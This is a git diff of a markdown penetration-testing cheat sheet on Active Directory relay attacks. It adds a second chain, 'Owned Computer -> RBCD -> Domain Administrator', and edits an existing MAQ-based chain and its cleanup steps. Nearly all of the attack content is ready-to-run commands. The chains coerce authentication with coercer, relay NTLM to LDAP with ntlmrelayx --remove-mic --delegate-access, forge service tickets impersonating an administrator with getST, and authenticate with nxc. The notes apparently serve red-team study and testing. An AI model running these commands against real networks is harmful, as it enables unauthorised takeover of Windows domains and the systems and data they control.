@@ -24,7 +24,7 @@ Its not possible to relay SMB connections to LDAP(S) unless the Message Integrit
 - MAQ Greater than 0
 - Account to impersonate not in "Protected Users" or "Sensitive and cant be delegated"
 
-#### Attack Chain
+#### Attack Chain (MAQ -> RBCD -> Domain Administrator)
 
 > Coerce
 ```bash
@@ -32,7 +32,7 @@ coercer coerce -u "USERNAME" -p "PASSWORD" -d "DOMAIN" -t "TARGET" -l "LISTENER"
 ```
 > Relay
 ```
-sudo impacket-ntlmrelayx -t ldap://TARGET --remove-mic -smb2support --delegate-access
+impacket-ntlmrelayx -t ldap://TARGET --remove-mic -smb2support --delegate-access
 ```
 > RBCD
 ```bash
@@ -42,6 +42,28 @@ impacket-getST DOMAIN/'MACHINE$':'PASSWORD' -impersonate "ADMIN" -spn "SERVICE/T
 ```bash
 nxc smb "TARGET" --use-kcache 
 ```
+
+#### Attack Chain (Owned Computer -> RBCD -> Domain Administrator)
+- Have authentication material for an owned computer ```MACHINE$```
+- Account to impersonate not in "Protected Users" or "Sensitive and cant be delegated"
+
+> Coerce
+```bash
+coercer coerce -u "USERNAME" -p "PASSWORD" -d "DOMAIN" -t "TARGET" -l "LISTENER"
+```
+> Relay
+```python
+impacket-ntlmrelayx -t ldap://TARGET --remove-mic -smb2support --delegate-access --escalate-user "MACHINE$" --delegate-access --no-dump --no-da --no-acl
+```
+> RBCD
+```bash
+impacket-getST DOMAIN/'MACHINE$':'PASSWORD' -impersonate "ADMIN" -spn "SERVICE/TARGET FQDN" -dc-ip "DC IP"
+```
+> Authentication
+```bash
+nxc smb "TARGET" --use-kcache 
+```
+
 
 #### Cleanup
 
@@ -54,7 +76,7 @@ nxc smb "TARGET" --use-kcache
 # Clear msDS-AllowedToActOnBehalfOfOtherIdentity attribute
 Get-ADComputer -Identity "DC01$" | ForEach-Object { Set-ADObject -Identity $_.DistinguishedName -Clear "msDS-AllowedToActOnBehalfOfOtherIdentity" }
 
-# Remove Created Computer Account
+# Remove Created Computer Account (If used MAQ method)
 Remove-ADComputer -Identity "WSW01$"
 ```
 
